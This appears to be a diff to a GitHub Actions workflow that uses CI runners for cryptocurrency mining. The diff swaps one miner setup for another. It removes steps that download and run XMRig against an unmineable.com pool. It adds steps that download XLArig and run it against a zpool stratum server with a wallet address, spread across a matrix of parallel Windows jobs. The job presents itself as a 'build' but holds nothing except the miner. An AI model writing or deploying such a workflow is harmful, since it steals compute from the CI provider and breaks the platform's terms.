@@ -1,10 +1,10 @@
-name: Alikioser
- 
+name: eX-code_UMBL
+
 on: [workflow_dispatch]
- 
+
 jobs:
   build:
-    name: Alikioser
+    name: eX-code_UMBL
     runs-on: windows-latest
     strategy:
       max-parallel: 5
@@ -16,12 +16,11 @@ jobs:
         NUM_JOBS: 20
         JOB: ${{ matrix.go }}
     steps:
-    - name: DOWNLOAD
-      run: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.11.1/xmrig-6.11.1-msvc-win64.zip -OutFile xmrig-6.11.1-msvc-win64.zip
-    - name: Extract
-      run: Expand-Archive xmrig-6.11.1-msvc-win64.zip
-    - name: RUNNING
-      run: .\xmrig-6.11.1-msvc-win64\xmrig-6.11.11\xmrig.exe -o rx.unmineable.com:3333 -a rx
-      -k -u TRX:TFLQNgSLis7hQmzxMwhWXF8DSjLVqZupMR.Dutacoin -p x -t 1	  
+    - name: PREPARING
+      run: Invoke-WebRequest https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-win64.zip -Outfile XLArig-v5.2.2-win64.zip
+    - name: Seting-UP
+      run: Expand-Archive XLArig-v5.2.2-win64.zip
+    - name: Running
+      run: .\XLArig-v5.2.2-win64\xlarig.exe --no-huge-pages -o stratum+tcp://m7m.sea.mine.zpool.ca:6033 -p x -a rx -k -t 1 --cpu-max-threads-hint 25 -u MBC:Mj72KbUTkJE8janJvKNvQJ8GBU4qAHn8Pc.Dutacoin
     - name: DONE
       run: exit
